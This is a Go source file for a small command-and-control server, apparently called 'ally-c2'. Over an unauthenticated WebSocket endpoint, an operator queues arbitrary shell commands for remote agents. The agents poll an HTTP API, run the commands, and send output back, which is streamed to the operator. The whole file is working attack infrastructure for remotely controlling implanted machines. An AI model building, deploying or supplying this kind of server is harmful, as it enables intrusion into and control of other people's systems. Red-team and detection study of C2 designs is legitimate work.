package main

import (
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
	"github.com/gin-gonic/gin"
)

//struct for single agent
type AgentSession struct {
	ID          string    `json:"id"`
	LastSeen    time.Time `json:"last_seen"`
	TaskQueue   []string  `json:"task_queue"`   // agent task list
	OutputQueue []string  `json:"output_queue"` // agent output list 
}
//map off al the agents
var (
	clients = make(map[string]*AgentSession)
	mu      sync.Mutex
	operatorConn     *websocket.Conn 
	operatorConnMu   sync.Mutex      
)



//cli/operator endpoint
func handleOperator(c *gin.Context) {
	opts := &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	}
	
	conn, err := websocket.Accept(c.Writer, c.Request, opts)
	if err != nil {
		log.Printf("Error while handshake WebSocket: %v", err)
		return
	}
	defer conn.Close(websocket.StatusNormalClosure, "Closing session")

	//save operator connection 
	operatorConnMu.Lock()
	operatorConn = conn
	operatorConnMu.Unlock()

	//clean them variable when the ws close
	defer func() {
		operatorConnMu.Lock()
		operatorConn = nil
		operatorConnMu.Unlock()
	}()

	log.Println("[*] Operator connected with success!")
	ctx := c.Request.Context()

	for {
		var msg map[string]interface{}
		err := wsjson.Read(ctx, conn, &msg)
		if err != nil {
			log.Printf("[-] CLI-CLIENT disconnected: %v", err)
			break
		}

		action, ok := msg["action"].(string)
		if !ok {
			continue
		}

		log.Printf("[Command received] -> Action: %v", action)

		// add task cli to queue
		if action == "queue_task" {
			agentID := msg["agent_id"].(string)
			command := msg["data"].(string)

			mu.Lock()
			// Se l'agente non esiste, lo creiamo al volo
			if _, exists := clients[agentID]; !exists {
				clients[agentID] = &AgentSession{
					ID:        agentID,
					LastSeen:  time.Now(),
					TaskQueue: []string{},
				}
			}

			clients[agentID].TaskQueue = append(clients[agentID].TaskQueue, command)
			mu.Unlock()

			log.Printf("[+] Task '%s' accodato per l'agente %s", command, agentID)

			wsjson.Write(ctx, conn, map[string]string{
				"status": "success",
				"output": "Task successfully queued on server.",
			})
		} else if action == "list_agents" {
			mu.Lock()
			var agentList []string
			for id := range clients {
				agentList = append(agentList, id)
			}
			mu.Unlock()

			wsjson.Write(ctx, conn, map[string]interface{}{
				"status": "success",
				"agents": agentList,
			})
		}
	}
}




//#############################################
func main() {

	r := gin.Default()
	port := ":8080"

	// operator ep
	r.GET("/ws/operator", handleOperator)



	// GET /api/agent/poll?id=<agent id>
	r.GET("/api/agent/poll", func(c *gin.Context) {
		agentID := c.Query("id")
		if agentID == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
			return
		}

		mu.Lock()
		defer mu.Unlock()

		session, exists := clients[agentID]
		//automatinc session
		if !exists {
			clients[agentID] = &AgentSession{
				ID:        agentID,
				LastSeen:  time.Now(),
				TaskQueue: []string{},
			}
			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
			return
		}

		session.LastSeen = time.Now()

		if len(session.TaskQueue) == 0 {
			c.JSON(http.StatusOK, gin.H{"status": "no_tasks", "command": ""})
			return
		}

		//fifo of the fist comand
		command := session.TaskQueue[0]
		session.TaskQueue = session.TaskQueue[1:]

		c.JSON(http.StatusOK, gin.H{
			"status":  "task_assigned",
			"command": command,
		})
	})



	// POST /api/agent/output
	r.POST("/api/agent/output", func(c *gin.Context) {
		var req struct {
			ID     string `json:"id"`
			Output string `json:"output"`
		}

		if err := c.BindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"status": "error", "message": "Invalid JSON"})
			return
		}

		mu.Lock()
		if session, exists := clients[req.ID]; exists {
			session.OutputQueue = append(session.OutputQueue, req.Output)
			session.LastSeen = time.Now()
		}
		mu.Unlock()

		log.Printf("\n[Output ricevuto dall'agente %s]:\n%s\n", req.ID, req.Output)

		operatorConnMu.Lock()
		if operatorConn != nil {
			ctx := c.Request.Context()
			pushMsg := map[string]string{
				"type":   "agent_output",
				"agent_id": req.ID,
				"output": req.Output,
			}
			//send output with ws
			_ = wsjson.Write(ctx, operatorConn, pushMsg)
		}
		operatorConnMu.Unlock()

		c.JSON(http.StatusOK, gin.H{"status": "received"})
	})




	// connection error error 
	log.Printf("[*] ally-c2 server (Go) listening on %s...", port)
	err := r.Run(port)
	if err != nil {
		log.Fatalf("Error: critical server error: %v", err)
	}
}
